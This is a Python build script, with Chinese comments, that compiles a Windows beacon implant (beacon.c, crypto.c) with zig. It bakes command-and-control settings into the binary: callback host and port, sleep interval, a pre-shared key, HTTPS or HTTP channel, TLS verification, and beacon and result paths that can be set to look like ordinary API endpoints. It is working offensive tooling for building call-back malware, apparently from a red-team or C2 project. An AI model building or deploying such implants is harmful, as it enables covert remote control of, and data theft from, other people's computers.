"""beacon 植入体构建（Python 直调 zig，绕开 PowerShell 参数转义坑）。

用法：
  python ../../scripts/build_beacon.py --psk <64位hex> --host 127.0.0.1 --port 8800 \
      --sleep 1 --out beacon2.exe [--path-beacon /api/v1/heartbeat --path-result /api/v1/report]

字符串配置经 _STR2 字符串化注入 beacon.c（与 build.ps1 等价）。
"""

from __future__ import annotations

import argparse
import re
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ZIG = Path(r"E:\AI tools\zig\zig-x86_64-windows-0.17.1\zig.exe")


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(prog="build-beacon")
    parser.add_argument("--psk", required=True)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", default="8800")
    parser.add_argument("--sleep", type=int, default=3)
    parser.add_argument("--out", default="beacon.exe")
    parser.add_argument("--path-beacon", default="/beacon")
    parser.add_argument("--path-result", default="/result")
    parser.add_argument("--zig", default=str(ZIG))
    parser.add_argument("--scheme", default="https", choices=["https", "http"],
                        help="C2 信道 scheme（https 走系统 schannel）")
    parser.add_argument("--tls-verify", type=int, default=1, choices=[0, 1],
                        help="1=校验证书（生产）；0=忽略（自签测试）")
    args = parser.parse_args(argv)
    if not re.fullmatch(r"[0-9a-fA-F]{64}", args.psk):
        raise SystemExit("psk 必须是 64 位 hex")

    cc = [
        args.zig, "cc", "-O2", "-Wall", "-Wextra",
        f"-DC2_HOST_RAW={args.host}",
        f"-DC2_PORT={args.port}",
        f"-DC2_SLEEP={args.sleep}",
        f"-DC2_PSK_HEX={args.psk}",
        f"-DC2_PATH_BEACON_RAW={args.path_beacon}",
        f"-DC2_PATH_RESULT_RAW={args.path_result}",
        f"-DC2_SCHEME_RAW={args.scheme}",
        f"-DC2_TLS_VERIFY={args.tls_verify}",
        "-o", args.out,
        str(HERE / "beacon.c"), str(HERE / "crypto.c"),
        # bcrypt: BCryptGenRandom（IV/beacon id）；advapi32: SystemFunction036 兜底
        "-lws2_32", "-lwinhttp", "-lbcrypt", "-ladvapi32",
    ]
    proc = subprocess.run(cc, capture_output=True, text=True, encoding="utf-8", errors="replace")
    if proc.returncode != 0:
        # 构建链不支持 bcrypt.lib 时退 SystemFunction036（RtlGenRandom，advapi32）
        d_index = cc.index("-o")
        fallback = cc[:d_index] + ["-DCMT1_NO_BCRYPT"] + cc[d_index:]
        fallback.remove("-lbcrypt")
        proc = subprocess.run(fallback, capture_output=True, text=True,
                              encoding="utf-8", errors="replace")
        if proc.returncode != 0:
            sys.stderr.write(proc.stdout + proc.stderr)
            raise SystemExit(f"构建失败（exit={proc.returncode}）")
        print("注意: bcrypt.lib 不可用，已退 SystemFunction036（CMT1_NO_BCRYPT）")
    print(f"built {args.out} -> {args.host}:{args.port}（beacon {args.path_beacon} / result {args.path_result}）")


if __name__ == "__main__":
    main(sys.argv[1:])
